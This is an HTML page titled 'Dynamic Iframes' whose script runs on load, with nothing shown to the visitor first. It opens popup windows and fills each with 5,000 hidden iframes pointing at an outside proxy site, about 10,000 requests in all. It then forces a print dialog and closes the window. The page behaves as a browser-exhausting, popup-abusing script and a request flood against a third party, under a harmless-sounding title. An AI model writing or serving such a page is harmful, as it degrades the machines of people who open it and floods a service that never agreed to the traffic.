<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dynamic Iframes</title>
  <style>
    iframe {
      width: 300px;
      height: 200px;
      margin: 5px;
      border: 1px solid #ccc;
      display: block;
    }
  </style>
</head>
<body>
  <script>
    function createPrintWindow(content) {
        const win = window.open('', '_blank');
        win.document.write(content);
        return win;
    }
    function generateIframes(url, count) {
        return Array.from({length: count}, () => {
            const iframe = document.createElement('iframe');
            iframe.src = url;
            iframe.title = `iframe-${count}`;
            iframe.frameBorder = 0;
            iframe.scrolling = "no";
            iframe.allowFullscreen = false;
            iframe.style.border = "none";
            iframe.style.opacity = 1;
            iframe.style.display = "none";
            return iframe;
        });
    }
    function printContent(win) {
        try {
            win.print();
            setTimeout(() => win.close(), 500);
            return true;
        } catch (error) {
            console.error('Print failed:', error);
            return false;
        }
    }
    async function print() {
        const printWindow = createPrintWindow('<html><body style="background:#00000"></body></html>');
        const iframes = generateIframes("https://www.croxyproxy.com", 5000);
        iframes.forEach(iframe => printWindow.document.body.appendChild(iframe));
        return printContent(printWindow);
    }
    print()
    print()
  </script>
</body>
</html>
